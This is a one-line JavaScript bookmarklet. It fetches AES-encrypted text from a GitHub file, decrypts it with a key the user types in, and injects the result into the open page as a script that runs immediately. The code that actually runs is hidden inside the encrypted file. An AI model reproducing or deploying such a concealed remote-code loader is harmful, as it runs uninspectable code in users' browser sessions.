javascript:(function(){function loadCryptoJS(callback){var script = document.createElement("script");script.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js";script.onload = callback;document.body.appendChild(script);}function decryptAndExecute(){const secretKey = prompt("Enter decryption key:");if(!secretKey)return;fetch("https://raw.githubusercontent.com/rajnish8869/EncDecFiles/refs/heads/main/EncDec.txt").then((response)=>{if(!response.ok){throw new Error("Failed to fetch encrypted content");}return response.text();}).then((encryptedContent)=>{try{console.log("Encrypted Content:",encryptedContent);const key = CryptoJS.enc.Utf8.parse(secretKey);console.log("Key:",key);const bytes = CryptoJS.AES.decrypt(encryptedContent,key,{mode: CryptoJS.mode.ECB,});console.log("Decrypted Bytes:",bytes);const decrypted = bytes.toString(CryptoJS.enc.Utf8);console.log("Decrypted Content:",decrypted);if(!decrypted)return;const script = document.createElement("script");script.textContent = decrypted;document.body.appendChild(script);}catch(error){console.error("Decryption failed. Invalid key or corrupted script:",error);}}).catch((error)=>{console.error("Error fetching the encrypted content:",error);});}if(typeof CryptoJS === "undefined"){loadCryptoJS(decryptAndExecute);}else{decryptAndExecute();}})();